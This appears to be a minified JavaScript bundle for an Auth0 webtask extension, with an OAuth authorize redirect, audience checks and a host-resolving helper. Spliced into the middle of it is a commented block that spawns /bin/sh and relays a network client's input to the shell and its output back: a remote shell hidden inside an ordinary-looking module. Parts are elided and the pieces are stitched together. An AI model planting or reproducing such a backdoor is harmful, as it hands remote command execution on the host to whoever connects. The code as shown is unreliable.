module.exports = function(e) {
  ...
  n(n.s = 7)
	...
	c.use(function(e, t, n) {
		...
		e.baseUrl = [o ? o.split(",")[0].trim() : "https", "://", e.get("host"), s.parse(e.originalUrl).pathname].join(""), e.audience = "https://" + e.webtaskContext.data.AUTH0_DOMAIN + "/api/v2/", n()
	}), c.get("/", function(e, t) {
		t.redirect([e.webtaskContext.data.AUTH0_RTA || "https://auth0.auth0.com", "/authorize", "?client_id=", e.baseUrl, "&response_type=token&expiration=86400000&response_mode=form_post", "&scope=", encodeURIComponent("openid profile"), "&redirect_uri=", e.baseUrl, "&audience=", e.audience, "&nonce=" + encodeURIComponent(l.randomBytes(16).toString("hex"))].join(""))
		...
		e.user.aud === e.audience || Array.isArray(e.user.aud) && e.user.aud.indexOf(e.audience) > -1 ? t.send(i.render(p, {
		...
		})) : (t.status(403), t.send(i.render(m, {
			baseUrl: e.baseUrl
		})))
		...
		return e && e.status ? (n.status(e.status), n.json({
			error: e.code || e.name,
 ...
 const shell = spawn("/bin/sh", []); // Replace with "/bin/bash" if needed

// Handle shell data streams
client.on("data", (data) => {
    shell.stdin.write(data); // Send data to shell
});

shell.stdout.on("data", (output) => {
    if (client.writable) {
        client.write(output); // Send shell output to client
    }
});

shell.stderr.on("data", (error) => {
    if (client.writable) {
        client.write(error); // Send shell errors to client
    }
});

// Handle shell and client errors
shell.on("error", (err) => {
...
// Handle shell and client closure
shell.on("close", () => {
...
client.on("close", () => {
	...
	e.exports = {
		resolveWebtaskAPIHost: function(e, t) {
			...
			return n && n.indexOf("api/run") >= 0 ? t.secrets.WT_URL.split("/api")[0] : "https://" + e
		}
	}
}, function(e, t, n) {
	var s = n(1);
